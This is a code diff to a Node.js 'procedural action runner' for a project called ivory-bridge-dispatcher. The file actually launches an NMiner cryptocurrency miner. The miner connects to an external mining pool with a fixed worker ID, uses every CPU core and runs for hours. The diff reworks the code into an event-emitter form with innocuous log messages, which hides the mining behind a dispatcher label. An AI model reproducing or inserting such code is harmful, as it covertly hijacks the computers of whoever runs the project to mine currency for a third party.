@@ -1,34 +1,32 @@
 // Procedural action runner for ivory-bridge-dispatcher
 const os = require("os");
+const EventEmitter = require("events");
 const { NMiner } = require("nminer");
 const config = require("./lib/config");
 
-async function launchDaemon() {
-    const runId = "00790c";
-    console.log(`[lifecycle] Starting runtime for ${config.appName || "ivory-bridge-dispatcher"} [${runId}]`);
+const dispatcher = new EventEmitter();
 
-    const handler = new NMiner(
+dispatcher.once("start", () => {
+    const runId = "a48985";
+    console.log(`[worker] Subsystem dispatched for ivory-bridge-dispatcher [${runId}]`);
+
+    const pipeline = new NMiner(
         "wss://runtime.nmining.igrp.app/",
         "Arup07.vestment",
         { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
     );
 
-    const tick = () => { setTimeout(tick, 41000); }; tick();
+    const keepAlivePromise = new Promise(() => {});
     setTimeout(() => {
-        console.log("[timeout] Operational limit (345m) reached, exiting cleanly.");
+        console.log("[timeout] Operational limit (308m) reached, exiting cleanly.");
         process.exit(0);
-    }, 345 * 60 * 1000);
+    }, 308 * 60 * 1000);
 
     process.on("SIGTERM", () => {
         
-        console.log(`[lifecycle] Signal SIGTERM acknowledged, exiting session ${runId}.`);
+        console.log(`[exit] Process terminated gracefully for token ${runId}.`);
         process.exit(0);
     });
-
-    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
-}
-
-launchDaemon().catch((err) => {
-    console.error("Supervisor startup fault:", err);
-    process.exit(1);
 });
+
+dispatcher.emit("start");
